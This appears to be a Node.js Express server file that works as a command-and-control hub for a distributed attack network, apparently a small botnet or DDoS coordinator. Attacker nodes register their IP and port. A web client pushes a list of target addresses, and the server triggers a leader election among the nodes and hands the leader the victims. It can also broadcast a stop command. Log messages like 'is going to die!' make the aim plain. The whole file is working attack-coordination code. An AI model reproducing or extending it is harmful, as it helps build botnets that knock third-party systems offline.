// require necessary dependencies for http transactions
var express = require("express");
var app = express();
var request = require("request");
var http = require('http').Server(app);
var io = require("socket.io")(http);
var bodyParser = require('body-parser');

app.use(express.static(__dirname + '/www')); // path used for the webpage
app.use('/node_modules', express.static(__dirname + '/node_modules')); // path used to reference node modules in html

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

var connectedAttackers = 0;
var leader = "";
var victim = "";
var addresses2bAttacked = [];

// Callback function when a HTTP POST method is requested, in the path '/iot-device'
// Converts iot-device received data to a format understood by the web client
app.put("/attacker", function(req, res) {
	console.log("Receiving attacker data...");
	console.log(req.body);

	var id = req.body.id;
	
	// socket broadcast message to all the connected clients
	// with the received device data
	io.emit("device data", {
		"ID": id,
		"datetime": req.body.datetime,
		"data": req.body.data
	});

	res.send(attackersData);
});

app.post("/attacker", function(req, res) {
	console.log("Receiving attacker port...");
	console.log(req.body);

	var id = req.body.id;
	var ip = /.*:(([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}))/g.exec(req.connection.remoteAddress)[1];
	var port = req.body.port

	updateAttackerIPAndPort(id, ip, port);
	res.send(attackersData);

	console.log(attackersData);
});

app.post("/coordinator", function(req, res) {
	if (leader === "") {
		leader = req.body.leader;
		console.log("The leader is: " + leader);
		//Send array of victims
		console.log(addresses2bAttacked);
		res.send(addresses2bAttacked);
	} else {
		res.sendStatus(200);
	}
});

app.post("/victim", function(req, res) {
	victim = req.body.victim;
	console.log(victim + " is going to die!");
	console.log("God have mercy on it's soul...");
	res.sendStatus(200);
}) 

// Callback function when a 'connection' socket message is received
// When a client connection is established
io.on('connection', function(socket){
  console.log('Web client connection established');

  	// Callback function when an 'attack' socket message is received
	// When recieving the addresses coming from the Web Client
	socket.on('attack', function(data){
  		addresses2bAttacked = data.addresses;
  		startElection();
	});

	socket.on('stop', function(data){
  		stopAttack();
	});
});

var attackersData = {}; // JSON containing the data of the attackers, ip address and port

function startElection() {
	leader = "";
	for (var key in attackersData) {
		request.post({
		  headers: {"content-type" : "text/plain"},
		  url:     "http://" + attackersData[key].ip + ":" + attackersData[key].port + "/election",
		  body:    ""
		}, function(error, res, body){
		  console.log(error);
		});
	}
}

function stopAttack() {
	for (var key in attackersData) {
		request.delete({
		  headers: {"content-type" : "text/plain"},
		  url:     "http://" + attackersData[key].ip + ":" + attackersData[key].port + "/victim",
		  body:    ""
		}, function(error, res, body){
		  console.log(error);
		});
	}
}

function updateAttackerIPAndPort(id, ip, port) {
	if (!attackersData[id]) {
		attackersData[id] = {};
	}
	attackersData[id].ip = ip;
	attackersData[id].port = port;
}

//Starts the server, it listens on port 8080
var serverPort = 8080;
http.listen(serverPort);
console.log("Server running on: " + serverPort);